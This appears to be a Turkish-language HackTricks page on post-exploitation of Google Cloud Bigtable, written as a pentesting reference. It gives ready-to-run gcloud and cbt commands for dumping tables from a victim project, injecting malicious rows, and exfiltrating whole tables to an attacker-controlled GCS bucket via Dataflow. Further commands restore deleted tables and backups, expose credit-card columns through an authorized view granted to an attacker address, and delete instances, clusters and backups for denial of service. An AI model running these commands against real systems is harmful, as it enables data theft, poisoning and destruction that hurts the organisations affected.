# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Aşağıdaki komutların yerelde çalışması için `cbt` CLI'ını Cloud SDK üzerinden bir kere kurun:
>
> <details>
>
> <summary>cbt CLI'yi yükleyin</summary>
>
> ```bash
> gcloud components install cbt
> ```
>
> </details>

### Satırları Oku

**İzinler:** `bigtable.tables.readRows`

cbt, Cloud SDK ile birlikte gelir ve herhangi bir middleware gerektirmeden admin/data API'leri ile iletişim kurar. Bunu ele geçirilmiş project/instance üzerine yönlendirip tablodan doğrudan satırları dökebilirsiniz. Sadece bir göz atma gerekiyorsa taramayı sınırlandırın.

<details>

<summary>Bigtable kayıtlarını oku</summary>
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
</details>

### Satır yazma

**İzinler:** `bigtable.tables.mutateRows`, (değişikliği doğrulamak için `bigtable.tables.readRows` iznine ihtiyacınız olacak).

Aynı aracı kullanarak istediğiniz hücrelere upsert yapın. Bu, configs içine backdoor koymanın, web shells bırakmanın veya poisoned dataset rows eklemenin en hızlı yoludur.

<details>

<summary>Kötü amaçlı satır ekle</summary>
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
</details>

`cbt set` `@/path` sözdizimi ile ham baytları kabul eder, böylece derlenmiş payload'ları veya serileştirilmiş protobuf'ları downstream servislerin tam olarak beklediği şekilde gönderebilirsiniz.

### Satırları kendi bucket'ınıza aktar

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Satırları sizin kontrolünüzdeki bir GCS bucket'ına akıtan bir Dataflow job'u başlatarak tüm tablonun içeriğini exfiltrate etmek mümkündür.

> [!NOTE]
> Bu dışa aktarma işlemini gerçekleştirmek için yeterli izinlere sahip bir SA üzerinde `iam.serviceAccounts.actAs` iznine ihtiyacınız olacağını unutmayın (varsayılan olarak, aksi belirtilmedikçe varsayılan compute SA kullanılacaktır).

<details>

<summary>Bigtable'ı GCS bucket'ına aktar</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

> [!NOTE]
> Şablonu `Cloud_Bigtable_to_GCS_Parquet` veya `Cloud_Bigtable_to_GCS_SequenceFile` olarak değiştirin eğer JSON yerine Parquet/SequenceFile çıktılarını istiyorsanız. İzinler aynı; sadece şablon yolu değişir.

### Satırları içe aktarma

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Saldırgan kontrolündeki bir bucket'tan, satırları saldırganın kontrolündeki bir GCS bucket'ına akıtan bir Dataflow job başlatarak tüm bir tablonun içeriğini içe aktarmak mümkündür. Bunun için saldırganın önce beklenen şema ile içe aktarılacak verileri içeren bir parquet dosyası oluşturması gerekir. Saldırgan, önceki teknikte `Cloud_Bigtable_to_GCS_Parquet` ayarını kullanarak verileri parquet formatında dışa aktarabilir ve indirilen parquet dosyasına yeni kayıtlar ekleyebilir.



> [!NOTE]
> Dışa aktarımı gerçekleştirmek için yeterli izinlere sahip bir SA üzerinde `iam.serviceAccounts.actAs` iznine ihtiyacınız olacağını unutmayın (varsayılan olarak, aksi belirtilmezse, varsayılan compute SA kullanılacaktır).

<details>

<summary>GCS bucket'tan Bigtable'a içe aktarma</summary>
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

### Yedekleri Geri Yükleme

**İzinler:** `bigtable.backups.restore`, `bigtable.tables.create`.

Bu izinlere sahip bir saldırgan, eski hassas verileri kurtarabilmek için kontrolü altındaki yeni bir tabloya bir yedeği geri yükleyebilir.

<details>

<summary>Bigtable yedeğini geri yükle</summary>
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
</details>

### Silinmiş tabloları geri yükleme

**İzinler:** `bigtable.tables.undelete`

Bigtable, genellikle varsayılan olarak 7 gün olan bir bekleme süresiyle yumuşak silmeyi (soft-deletion) destekler. Bu süre içinde `bigtable.tables.undelete` iznine sahip bir saldırgan, yakın zamanda silinmiş bir tabloyu geri yükleyebilir ve tüm verilerini kurtararak yok edildiği düşünülen hassas bilgilere erişebilir.

Bu özellikle şunlar için faydalıdır:
- Olay müdahalesi sırasında savunma ekipleri tarafından silinen tablolardan veri kurtarma
- Kasıtlı olarak temizlenen geçmiş verilere erişim
- Kalıcılığı korumak için kazara veya kötü niyetli silmeleri geri alma

<details>

<summary>Bigtable tablosunu geri yükle</summary>
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
</details>

> [!NOTE]
> Geri alma (undelete) işlemi yalnızca yapılandırılmış saklama süresi içinde (varsayılan 7 gün) çalışır. Bu pencere sona erdikten sonra, tablo ve verileri kalıcı olarak silinir ve bu yöntemle kurtarılamaz.


### Yetkilendirilmiş Görünümler Oluştur

**İzinler:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Yetkilendirilmiş görünümler, tablonun seçilmiş bir alt kümesini sunmanıza izin verir. En az ayrıcalık ilkesine uymak yerine, ilgilendiğiniz **tam olarak hassas sütun/satır kümelerini** yayınlamak ve kendi principal'inizi beyaz listeye almak için bunları kullanın.

> [!WARNING]
> Şöyle ki: yetkilendirilmiş bir görünüm oluşturmak için ayrıca temel tablodaki satırları okuma ve değiştirme yeteneğine sahip olmanız gerekir; dolayısıyla ekstra bir izin elde etmiyorsunuz ve bu nedenle bu teknik çoğunlukla işe yaramaz.

<details>

<summary>Yetkilendirilmiş görünüm oluştur</summary>
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
</details>

Çünkü erişim görünüme göre sınırlandırıldığından, savunucular genellikle yeni, yüksek hassasiyetli bir uç nokta oluşturduğunuz gerçeğini gözden kaçırır.

### Yetkili Görünümleri Okuma

**İzinler:** `bigtable.authorizedViews.readRows`

Bir Yetkili Görünüme erişiminiz varsa, okuma isteklerinizde yetkili görünüm adını belirterek Bigtable client kütüphanelerini kullanarak verileri okuyabilirsiniz. Yetkili görünümün tablodan erişebileceklerinizi muhtemelen sınırlayacağını unutmayın. Aşağıda Python kullanarak bir örnek bulunmaktadır:

<details>

<summary>Yetkili görünümden okuma (Python)</summary>
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
</details>

### Silme İşlemleri Yoluyla Hizmet Reddi

**İzinler:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bigtable'e ait silme izinlerinin herhangi biri, hizmet reddi (DoS) saldırıları için kullanılabilir. Bu izinlere sahip bir saldırgan, kritik Bigtable kaynaklarını silerek operasyonları aksatabilir:

- **`bigtable.appProfiles.delete`**: Uygulama profillerini siler; istemci bağlantılarını ve yönlendirme yapılandırmalarını bozar
- **`bigtable.authorizedViews.delete`**: Yetkili görünümleri kaldırır; uygulamalar için meşru erişim yollarını keser
- **`bigtable.authorizedViews.deleteTagBinding`**: Yetkili görünümlerden etiket bağlarını kaldırır
- **`bigtable.backups.delete`**: Yedek anlık görüntüleri yok eder; felaket kurtarma seçeneklerini ortadan kaldırır
- **`bigtable.clusters.delete`**: Tüm kümeleri siler; verilerin anında kullanılamaz hale gelmesine neden olur
- **`bigtable.instances.delete`**: Tam Bigtable örneklerini kaldırır; tüm tabloları ve yapılandırmaları siler
- **`bigtable.tables.delete`**: Bireysel tabloları siler; veri kaybına ve uygulama hatalarına yol açar

<details>

<summary>Bigtable kaynaklarını sil</summary>
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
</details>

> [!WARNING]
> Silme işlemleri genellikle anlık ve geri döndürülemezdir. Bu komutları test etmeden önce yedeklerin var olduğundan emin olun; aksi takdirde kalıcı veri kaybına ve ciddi hizmet kesintilerine neden olabilirler.

{{#include ../../../banners/hacktricks-training.md}}
